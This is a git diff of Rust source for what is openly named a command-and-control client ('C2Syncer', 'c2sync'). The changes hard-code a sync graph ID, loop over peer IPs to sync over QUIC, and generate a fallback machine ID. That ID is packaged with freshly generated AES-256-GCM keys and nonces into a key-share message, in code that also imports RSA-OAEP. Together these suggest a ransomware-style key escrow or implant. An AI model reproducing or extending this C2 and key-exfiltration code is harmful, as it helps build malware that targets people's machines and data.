@@ -13,13 +13,14 @@ use std::{
     sync::Arc,
     path::{Path, PathBuf},
     fs,
-    io::Write
+    io::Write,
+    str::FromStr
 };
 use aes::{Aes256, cipher::{KeyInit, generic_array::GenericArray}};
 use aes_gcm::{AeadCore, Aes256Gcm, aead::Aead};
 use aranya_policy_ifgen::Actionable;
 use aranya_runtime::{storage::GraphId, Sink, VmEffect};
-use aranya_crypto::Rng;
+use aranya_crypto::{Csprng, Rng};
 use machine_uid::machine_id;
 use rsa::{BigUint, Oaep, RsaPublicKey, sha2::Sha256};
 use tokio::time::{Duration, sleep};
@@ -123,7 +124,8 @@ fn main() {
     let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
     let cs = aranya.init_aranya(policy);
 
-    let graph = GraphId::from_bytes(config::GRAPH_BIN.try_into().unwrap());
+    // let graph = GraphId::from_bytes(config::GRAPH_BIN.try_into().unwrap());
+    let graph = GraphId::from_str("FxoQd2k4TCugs8u38utki1PBkhspw9dVdwyTbWLzA8b6").unwrap();
     aranya.set_graph(graph);
 
     let mut syncer = C2Syncer::new(cs, sink);
@@ -164,15 +166,24 @@ fn main() {
 
         // TODO: LOL i mean, it takes like 10 tries for it to 'parse peers' idk
         for i in 1..10 {
-        for ip in &ips {
-            c2sync(
-                SocketAddr::new(*ip, config::PORT),
-                Arc::clone(&quic),
-                Arc::clone(&syncer),
-                graph
-            ).await;
+            for ip in &ips {
+                c2sync(
+                    SocketAddr::new(*ip, config::PORT),
+                    Arc::clone(&quic),
+                    Arc::clone(&syncer),
+                    graph
+                ).await;
+            }
         }
-        }
+        
+        let machineid = match machine_id::get_machine_id() {
+            Ok(v) if v.len() > 0 => v,
+            _ => {
+                let mut bytes = [0u8; 16];
+                aranya_crypto::Rng.fill_bytes(&mut bytes);
+                hex::encode(bytes)
+            }
+        };
 
         loop {
             sleep(Duration::from_millis(1000)).await;
@@ -216,14 +227,10 @@ fn main() {
                 let nonce = Aes256Gcm::generate_nonce(Rng);
                 let aes = Aes256Gcm::new(&key);
 
-                let Ok(machineid) = machine_id::get_machine_id() else {
-                    continue;
-                };
-
                 let share = Aes256ShareMessage {
                     key: key.into(),
                     nonce: nonce.into(),
-                    machine_id: machineid
+                    machine_id: machineid.to_string()
                 };
 
                 println!("{:?}", share.nonce);
